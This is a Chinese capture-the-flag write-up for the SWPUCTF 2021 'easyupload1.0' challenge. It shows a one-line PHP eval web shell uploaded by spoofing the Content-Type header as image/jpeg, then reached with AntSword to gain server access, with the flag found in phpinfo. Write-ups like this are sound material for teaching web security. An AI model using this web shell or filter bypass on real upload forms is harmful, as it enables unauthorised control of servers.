# [SWPUCTF 2021 新生赛]easyupload1.0


# [SWPUCTF 2021 新生赛]easyupload1.0

![ [SWPUCTF 2021 新生赛]easyupload1.0-1](https://pic.imgdb.cn/item/653a249bc458853aef7587cf.jpg)

丢个木马上去

```php
<?php @eval($_POST['Lyrio']);phpinfo();?> // phpinfo() 在这里充当标记的作用
```

看样子是被过滤了，查看页面源码，过滤代码不在前端而在后端

![ [SWPUCTF 2021 新生赛]easyupload1.0-2](https://pic.imgdb.cn/item/653a2580c458853aef783947.jpg)

后端过滤代码是怎么个机制也不知道，只能用绕过的方法一个个去试

先尝试绕过 MIME 验证

由于一般是不会过滤图片文件的，BurpSuite 抓包，上传木马，将`Content-Type: application/octet-stream`改成`Content-Type:image/jpeg`

![ [SWPUCTF 2021 新生赛]easyupload1.0-3](https://pic.imgdb.cn/item/653a272bc458853aef7d4568.jpg)

> Content-Type：
>
> - `image/jpeg`  ：jpg 图片格式
> - `image/png`    ：png 图片格式
> - `image/gif`    ：gif 图片格式
> - `text/plain` ：纯文本格式
> - `text/xml`      ：  XML 格式
> - `text/html`    ：  HTML 格式

直接绕过

![ [SWPUCTF 2021 新生赛]easyupload1.0-4](https://pic.imgdb.cn/item/653a2752c458853aef7da990.jpg)

记住木马文件上传的位置，访问一下看能不能执行

![ [SWPUCTF 2021 新生赛]easyupload1.0-5](https://pic.imgdb.cn/item/653a27c4c458853aef7ede6d.jpg)

phpinfo() 执行了，@eval($_POST['Lyrio']) 应该也执行了

用蚁剑连接后门

![ [SWPUCTF 2021 新生赛]easyupload1.0-6](https://pic.imgdb.cn/item/653a286fc458853aef80b4bc.jpg)

到这就算拿到服务器权限

![ [SWPUCTF 2021 新生赛]easyupload1.0-7](https://pic.imgdb.cn/item/653a289ec458853aef813be0.jpg)

找到并查看 flag.php

![ [SWPUCTF 2021 新生赛]easyupload1.0-8](https://pic.imgdb.cn/item/653a28e6c458853aef820bc8.jpg)

> 正常来说通过 getshell 拿到 flag 就行了(题目也是这个意思)，但是这个 flag 是错误的，真正的 flag 在 phpinfo 里， CTRL+F 搜索 flag 就能找到，这题有点过于绕了
>
> ![[SWPUCTF 2021 新生赛]easyupload1.0-9](https://pic.imgdb.cn/item/653a2a32c458853aef856f9d.jpg)
